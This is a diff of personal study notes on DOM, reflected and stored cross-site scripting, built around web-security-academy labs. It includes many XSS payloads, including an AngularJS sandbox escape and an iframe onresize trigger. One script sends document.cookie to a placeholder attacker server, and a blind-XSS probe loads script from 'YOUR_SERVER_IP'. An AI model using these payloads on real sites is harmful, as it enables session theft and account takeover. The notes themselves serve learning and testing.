@@ -130,7 +130,7 @@ attackers attack the Dom when a page takes user input and alters the Dom based
 on that input.
 
 it happens when a website contains JavaScript that takes an attacker-controllable value,
-known as a *source*, and passes it into a dangerous function, known as a *sink*.
+known as a *source*, and passes it into a dangerous function, known as a *sink* (writes it to a sink).
 
 * the main source for DOM XSS is the URL.
 * DOM could be manipulated by [DOM Objects](DOM.md#_DOM_Objects).
@@ -163,196 +163,64 @@ maybe? DOM XSS with different sources and sinks
 
 EX:
 
-### sink: `document.write`, source: `location.search`
+* [sink: `document.write`, source: `location.search`](XSS_examples.md#sink:_`document.write`,_source:_`location.search`)
+* [[XSS_examples.md#sink `innerhtml`, source `location.search` |sink `innerhtml`, source `location.search`]]
+* [[XSS_examples#jQuery anchor; sink: `href` attribute , source: `location.search`|jQuery anchor; sink: `href` attribute , source: `location.search`]]
+* [[XSS_examples#jQuery `selector` sink using a `hashchange` event|jQuery `selector` sink using a `hashchange` event]]
+* [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|AngularJS expression with angle brackets and double quotes HTML-encoded]]
+#### [[Reflected DOM XSS]]
 
-`document.write('... <script>alert(document.domain)</script> ...');`
+#### [[Stored DOM XSS]]
 
-payload:
 
-`/?search=smn123"><script>alert('XSS+by+Vickie')%3B<%2Fscript>`
+# blocked
 
-result in the code:
+* double quotes escaped:
+  * [[Reflected DOM XSS |adding a \ to escape the added \]]
+* angle brackets  and double quotes encoded
+  * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|exploiting $eval.constructor]]
 
-1.
+# XSS html tags
 
-```html
-<img src="/resources/images/tracker.gif?searchTerms=smn123"> <script>alert('XSS by Vickie');</script>
-```
+## `script`
 
-2. something similar: `/product?productId=1&storeId=smn12</select><script>alert("q")</script>`
+* inline script: embedded in the html
+* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`
 
-### sink: `innerhtml`, source: `location.search`
+EX:
 
-`innerhtml` doesn't accept `<script>` or `<svg> onload`, use `<img>` or `<iframe>`.
-
-source code:
-
-```js
-function doSerachQuery(query) {
-    document.getElementById('searchMessage').innerHTML = query;
-}
-```
-
-payload: `</span><img src=1 onerror=alert(document.domain)>`
-
-### jQuery anchor; sink: `href` attribute , source: `location.search`
-
-third party frameworks introduce new sources and sinks. [jQuery selectors](jQuery.md)
-
-URL:
-
-`https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=/`
-
-source code:
+* if the attacker injects this code in victim's browser, unpon visiting, victim
+sends a GET request to the attacker's machine:
 
 ```js
-(function() {
-$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
-});
+<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
 ```
 
-sets whatever is in `returnPath` in the `herf` of `backLink`.
-`href` is used for redirection, so we use a payload with `javascript`.
+* `<script>alert(document.domain)</script>`
 
-payload:
+## `<img>`
 
-`javascript:%20alert(document.cookie)` so `https://0a99001c0357321a81887acb00d8006d.web-security-academy.net/feedback?returnPath=javascript:%20alert(document.cookie)`
+EX:
 
-result in the code:
-
-`<a id="backLink" href="javascript: alert(document.cookie)">Back</a>`
-
-### jQuery `selector` sink using a `hashchange` event
-
-`$()` selector function, can be used to inject malicious objects into the DOM.
-`hash` is user controllable and could be used to inject into the `$()`.
-
-source:
-
-`hashchange` event handler: on `hashchange`, performs the following function; uses
-a *selector* to find the given fragment, then scrolls to it.
-you should send the exploit to the victim so that it triggers a `hashchange` event, when it's loaded.
-
-```js
-$(window).on('hashchange', function() {
-  var element = $(location.hash);
-  element[0].scrollIntoView(); });
-```
-
-payload:
-
-trigger a `hashchange` event without user interaction:
-
-`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
-changes the fragment on load, activating a `hashchange` event, then the selector adds it to the DOM. (see the function below
-
-### AngularJS expression with angle brackets and double quotes HTML-encoded:
-
-* if it has `ng-app` (directive)  somewhere: then it's using angular, so you
-  can run js inside {{}}. so, sending {{1+1}}, returns 2.
-
-  but something like this: {{alert()}} doesn't work, perhaps because there is some
-  protections.
-
-  using this, in the search box with angle bracket encoded: `{{$eval.constructor('alert(1)')()}}`
-  * the `()` in the end, call the function we defined before it.
-  * more on how this works `https://www.youtube.com/watch?v=QpQp2JLn6JA`
-
-```js
-<script>
-    var searchTerms = '';
-    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-</script>
-```
-
-#### Reflected DOM XSS
-
-a type of DOM that goes to the server and back.
-
-pure DOM XSS (a script reads data -from the URL or other client side sources-
-and writes it to a sink) is an entirely client-side issue, payload inserted into the page.
-
-reflected XSS is a server-side issue, payload reflected into the HTML.
-
-sources can also get data from the website (not just browser)
-
-website reflect URL parameters in serve's HTML responses (happens in normal XSS)
-
-RDXSS: attack vector is client side, interacts with the server then is inserted
-into the DOM:
-  
-  * server processes the request
-  * echoes the data into the response
-  * the data might be placed into a *JavaScript string literal* or a *data item
-    in the DOM*
-  * a script writes the data into a *sink*
-
-* `eval()` function evaluates JavaScript code represented as a string and
-  returns its completion value.
-
-  `'var searchResultsObj = ' + this.responseText`
-
-how to:
-
-use network tab in chrome inspector tool (or burp) to see the requests made to the
-server after submitting the input.
-
-the response could be different based on the server's actions.
-
-in this case, it's a `JSON` object:
-`{"results":[],"searchTerm":"<script>alert(1);</script>"}`
-
-payload: `\"}-alert(1) //`
+* `<img onload=alert('the image has been loaded!') src="example.png">`
+* `<img src=1 onerror=alert(1)>`
 
 
-backslash is there to escape the backslash the server puts to comment the double quote.
-`
-\\
-`
-to comment out the rest.
+## `iframe`
 
-result:
 
-`{"results":[],"searchTerm":"\\"}-alert(1) // {\\""}`
-
-the suggested payload: `\"-alert(1) }//`
-the result:
-`{"results":[],"searchTerm":"\\"-alert(1) }//"}`
-
-#### Stored DOM XSS
-
-* server receives data from one request
-* stores it
-* later includes it in a response
-* A script in the later response contains a *sink*
-
-if you entered some html character (< e.g.) and it's shown in the output, then
-it is encoded successfully and otherwise.
-
-payload: `<><img src=1 onerror=alert()>`
-
-result:
-
-`<p>&lt;&gt;<img src="1" onerror="alert()"></p>`
-
-the stuff were inside a `p` tag in the first place.
-
-the second `<p>`'s `<>` are encoded:
-`  function escapeHTML(html) {
-        return html.replace('<', '&lt;').replace('>', '&gt;');
-    }`
+## `<select>``</select>`
 
 ### XSS between HTML tags
 
-When the XSS context is text between HTML tags, you need to introduce some new
-HTML tags designed to trigger execution of JavaScript.
-
-`<script>alert(document.domain)</script>
-<img src=1 onerror=alert(1)>`
+When the XSS context is text between HTML tags, you need to add new HTML tags to
+trigger execution of JavaScript. e.g. `<img>`, `<script>`
 
 #### Reflected XSS into HTML context with most tags and attributes blocked
 
 test process:
+
+* see if you could add these to the examine part
 
 trying html tags and they get filtered:
 `<img src=1 onerror=print()>`
@@ -381,9 +249,7 @@ we can resize the iframe on page load and the XSS will be executed automatically
 
 it needs that the victim to visit the attacker controlled page.
 
-`<iframe
-src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
-onload=this.style.width='100px'>`
+`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`
 
 the iframe being resized as soon as it's loaded, triggering `onresize` events.
 
@@ -861,6 +727,7 @@ then after we take the user's cookie, we will simply add it into a request to th
 
 * you can use `john the ripper` to find the hashed values and specify the algorithm using: `--format=raw-md5`
 
+
 # possible defenses against XSS
 
 * regex to ban script tags
@@ -872,32 +739,6 @@ monitoring the input:
 
 POC:
 `<script>alert('XSS by Vickie');</script>`
-
-# XSS html tags
-
-## `script`
-
-* inline script: embedded in the html
-* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`
-
-EX:
-
-if the attacker injects this code in victim's browser, unpon visiting, victim
-sends a GET request to the attacker's machine:
-
-```js
-<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
-```
-
-## `<img>`
-
-EX:
-
-`<img onload=alert('the image has been loaded!') src="example.png">`
-
-## `iframe`
-
-## `<select>``</select>`:
 
 
 # HTML attributes
@@ -918,3 +759,10 @@ the same alert in base64 to bypass filters.
 try making the victim’s browser generate a request to a server you own:
 `<script src='http://YOUR_SERVER_IP/xss'></script>`
 If you see a request to the path /xss, a blind XSS has been triggered!
+
+# how to handle links to examples
+ 1. in some other file (at some point I will have to have multiple examples in one file and
+    I should be able to link to an specific one) not sure if it's supported in pandoc but it
+    is in obs, and no idea on vimwiki
+ 2. each example in separate file (too messy, but works)
+ 3. in the same docuement: will be too long and slow.
